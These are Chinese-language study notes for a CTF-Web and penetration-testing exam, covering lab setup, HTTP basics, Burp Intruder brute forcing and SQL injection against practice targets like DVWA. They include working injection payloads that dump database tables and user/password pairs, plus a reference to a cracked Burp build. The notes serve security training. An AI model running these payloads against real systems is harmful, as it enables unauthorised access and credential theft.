# 考试说明
100 / 70
20 + 50 + 30（选择题 CTF-Web PT ）

# 知识体系
* Web安全 -- 60-70
* 数据库  -- 10-20
* 操作系统

  CTF - 5 key1{sdfghjkl}
  1. SQL注入
  2. 文件上传
  3. 文件包含
  4. 命令执行
  5. XSS
  6. 代码审计 - PHP
  7. 日志分析
  PT - Windows
  1. 后台
  2. 数据库
  3. 桌面 administrator
# Web安全
## 环境搭建
  PC：8G 500G
  公网IP - VPS

  虚拟机：VM/Vbox -- 快照
  攻击：Kali - vm/Backbox; Windows 7/10
  靶机：owaspbwa/vulhub/vulnhub/pensterlab

  Windows：
    1. phpstudy
    2. dvwa -- /www
    3. config.inc.php -- mysql
## HTTP协议
  * 基于请求和响应
  * 明文传输 -- https（SSL/TLS） 80/443
  * 无状态 -- Cookie/SessionID
### GET vs POST
  * GET 参数放在URL里
  * POST 参数放在请求正文里
  * GET 有大小限制，POST没有
### 请求
  * 请求头
    - Cookie
  * 请求正文
### 响应
  * 响应头
    - 响应状态码 200/300-301-302/400-401-404-403/500
  * 响应正文
### Tool
  * Burp -- proxy -- BurpUnlimited.jar
    - Proxy -- options
    - browser -- proxy
  * Firefox -- FoxyProxy Standard
  * Chrome -- SwitchyOmega
### 暴力破解
  * dvwa - low
  1. 抓包
  2. Intruder （Ctrl + I）
  3. Intruder -- position -- clear -- add
  4. payloads -- load
  5. attack
  6. 找不一样的（status、length）
## SQL注入
### 注入原理
  select * from user where id='1' order by 5 -- ss'  trim
  * 用户的输入作为SQL语句来执行
### 注入流程
  1. 判断注入点 '
    - id=1 -- 数字
    - id='1' -- 字符
    - 注释 # +--+
    - 万能密码 'or''='
    - like '%1%'
  2. 库
  3. 表
  4. 字段
  5. 内容
### 注入类型
select * from user where id=1 order by 5
#### 联合查询
  1. order by 5 -- 列数（select后，折半查找）
  2. union select 1,2 -- ss -- 哪些列在页面显示
    - version()/user()/database()/@@basedir
  3. 表 information_schema.tables/columns（mysql>5.0）
    1' union select table_name,2 from information_schema.tables where table_schema = database() -- ss
  4. 字段
    1' union select column_name,2 from information_schema.columns where table_schema = database() and table_name='users' -- ss
  5. 内容
    1' union select user,password from users -- ss
    - group_concat(user,0x7e,password)
#### 暴力破解(布尔注入)
  1. and exists(select * from admin) -- ss  -->表
  2. and exists(select user from admin) -- ss  -->列
  3. and ascii(mid((select user from users limit 0,1),1,1))>96
    - 0-9 48-57
    - a-z 97-122
    - A-Z 65-90
    - length

    * 练习1 - sqli-lab：3

#### 报错注入
#### 延时注入
#### 绕过
### 注入工具
